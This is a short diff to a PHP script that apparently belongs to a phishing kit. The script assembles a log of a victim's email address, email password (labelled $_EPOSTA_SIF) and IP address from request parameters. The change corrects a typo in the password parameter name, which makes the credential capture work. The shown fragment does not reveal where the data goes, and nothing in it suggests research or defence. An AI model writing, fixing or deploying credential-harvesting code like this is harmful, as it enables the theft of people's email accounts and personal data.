@@ -34,7 +34,7 @@ if(isset($_GET['comen']))
     
     \$_EPOSTA        : " . $_GET['email'] . "
     
-    \$_EPOSTA_SIF    : " . $_GET['emailPasswword'] . "
+    \$_EPOSTA_SIF    : " . $_GET['emailPassword'] . "
     
     \$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
     
